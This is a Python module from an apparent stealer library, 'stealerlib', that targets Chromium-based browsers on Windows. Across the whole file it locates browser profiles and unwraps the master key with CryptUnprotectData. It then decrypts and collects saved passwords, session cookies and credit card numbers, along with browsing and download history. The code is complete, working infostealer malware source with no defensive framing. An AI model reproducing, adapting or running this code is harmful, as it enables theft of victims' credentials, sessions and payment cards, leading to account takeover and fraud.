#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/browser/chromium.py
"""

from stealerlib.browser import *


class Chromium:
    """This class provides methods for extracting and decrypting information from Chromium based Web Browser databases

    Attributes:
        appdate     The local filepath for the APPDATA folder
        browsers    A dictionary containing the name and local file path for each popular browser 
        profiles    A list containing the default Chrome Profile names

        chromium_passwords  A list of (site_url, username, password) lists for each saved password
        chromium_downloads  A list of (tab_url, local_path) lists for each saved download
        chromium_cookies    A list of (site_url, title, timestamp) lists for each saved cookie
        chromium_history    A list of (host, name, path, value, expires?, expire_date) lists for each site in the saved history
        chromium_banking    A list of (name, month, year, number, date_modified) lists for each saved bank card
    """

    def __init__(self): 
        self.appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.chromium_passwords = []
        self.chromium_downloads = []
        self.chromium_cookies = []
        self.chromium_history = []
        self.chromium_banking = []

    def cget(self, func: callable) -> list:
        temp_data = []

        for _, path in self.browsers.items():
            if not os.path.exists(path):
                continue

            self.master_key = self.get_encryption_key(f'{path}\\Local State')
            if not self.master_key:
                continue

            for profile in self.profiles:
                if not os.path.exists(path + '\\' + profile):
                    continue

                data = func(path, profile)
                temp_data.append(data)

        return temp_data

    def get_encryption_key(self, path: str) -> bytes:
        """Retrieves the master encryption key used to encrypt the user's data

        Parameters:
            self (object): The object passed to the method
            path (str): The browser path to get the encryption key from

        Returns:
            bytes: The encryption key we'll use to decrypt the user's passwords
        """

        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
            return

        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        """Decrypts an encrypted password using the given encryption key

        Parameters:
            self (object): The object passed to the method
            password (str): The encrypted password to decrypt
            key (str): The master key to use for the decryption

        Returns:
            str: The decrypted password
        """

        vector = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, vector)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def _chromium_passwords(self, path: str, profile: str) -> list:
        """Retrieves the site url, username and password from the passed Chromium browser by connecting to its database file -
           and decrypting the passwords using the encryption key

        Parameters:
            self (object): The object passed to the method
            path (str): Chromium browser path to get the passwords from
            profile (str): Chrome profile to use (if available)

        Returns:
            list[list[str, ...]]: list of (site_url, username, password) lists (derived from DataTypes conv()) 

        Example:
            chromium = Chromium()
            chromium._chromium_passwords()
        """

        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return

        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            password = self.decrypt_password(row[2], self.master_key)
            login = DataTypes.Login(row[0], row[1], password)
            self.chromium_passwords.append(login.conv())

        conn.close()
        os.remove('login_db')

        return self.chromium_passwords

    def _chromium_cookies(self, path: str, profile: str):
        """Retrieves the site host, cookie name, value and various other information from the passed Chromium browser -
           by connecting to its database file and decrypting the cookies using the derived encryption key (from path)

        Parameters:
            self (object): The object passed to the method
            path (str): Chromium browser path to get the cookie information from
            profile (str): Chrome profile to use (if available)

        Returns:
            list[list[str, ...]]: list of (host, name, path, value, expires?, expire_date) lists (derived from DataTypes conv()) 

        Example:
            chromium = Chromium()
            chromium._chromium_cookies()
        """

        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return

        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            value = self.decrypt_password(row[3], self.master_key)
            cookie = DataTypes.Cookie(row[0], row[1], row[2], value, row[4])
            self.chromium_cookies.append(cookie.conv())

        conn.close()
        os.remove('cookie_db')

        return self.chromium_cookies

    def _chromium_history(self, path: str, profile: str) -> list:
        """Retrieves the site url, tab title and timestamp (when visited) for each site in the users history from the passed Chromium browser -
           by connecting to its database file and parsing the needed data

        Parameters:
            self (object): The object passed to the method
            path (str): Chromium browser path to get the web history from
            profile (str): Chrome profile to use (if available)

        Returns:
            list[list[str, ...]]: list of (site_url, title, timestamp) lists (derived from DataTypes conv()) 

        Example:
            chromium = Chromium()
            chromium._chromium_history()
        """

        web_history_db = f'{path}\\{profile}\\History'
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue

            site = DataTypes.Site(row[0], row[1], row[2])
            self.chromium_history.append(site.conv())

        conn.close()
        os.remove('web_history_db')

        return self.chromium_history

    def _chromium_downloads(self, path: str, profile: str) -> list:
        """Retrieves the site url and the target path (where the file was saved locally) for each site in the users downloads from the passed Chromium browser -
           by connecting to its database file and parsing the needed data

        Parameters:
            self (object): The object passed to the method
            path (str): Chromium browser path to get the download history from
            profile (str): Chrome profile to use (if available)

        Returns:
            list[list[str, ...]]: list of (tab_url, local_path) lists (derived from DataTypes conv()) 

        Example:
            chromium = Chromium()
            chromium._chromium_downloads()
        """

        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return

        shutil.copy(downloads_db, 'downloads_db')
        conn = sqlite3.connect('downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')

        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue

            download = DataTypes.Download(row[0], row[1])
            self.chromium_downloads.append(download.conv())

        conn.close()
        os.remove('downloads_db')

        return self.chromium_downloads

    def _chromium_credit_cards(self, path: str, profile: str) -> list:
        """Retrieves the card number and its related information for each bank card in the users saved cards from the passed Chromium browser -
           by connecting to its database file and parsing the needed data

        Parameters:
            self (object): The object passed to the method
            path (str): Chromium browser path to get the bank cards from from
            profile (str): Chrome profile to use (if available)

        Returns:
            list[list[str, ...]]: list of (name, month, year, number, date_modified) lists (derived from DataTypes conv()) 

        Example:
            chromium = Chromium()
            chromium._chromium_credit_cards()
        """

        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = self.decrypt_password(row[3], self.master_key)
            card = DataTypes.Card(row[0], row[1], row[2], card_number, row[4])
            self.chromium_banking.append(card.conv())

        conn.close()
        os.remove('cards_db')

        return self.chromium_banking
